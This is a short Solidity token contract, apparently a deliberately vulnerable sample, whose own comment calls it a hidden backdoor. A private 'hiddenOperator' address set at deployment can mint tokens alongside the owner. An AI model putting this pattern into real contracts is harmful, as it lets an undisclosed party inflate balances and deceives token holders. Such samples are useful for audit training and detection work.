// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

/// @title HiddenBackdoor - Looks normal but includes privileged hidden address
contract HiddenBackdoor {
    address public owner;
    address private hiddenOperator;
    mapping(address => uint256) public balances;

    constructor(address _hiddenOperator) {
        owner = msg.sender;
        hiddenOperator = _hiddenOperator;
    }

    function mint(address to, uint256 amount) external {
        require(
            msg.sender == owner || msg.sender == hiddenOperator,
            "Not authorized"
        );
        balances[to] += amount;
    }

    function checkBalance(address user) external view returns (uint256) {
        return balances[user];
    }
}
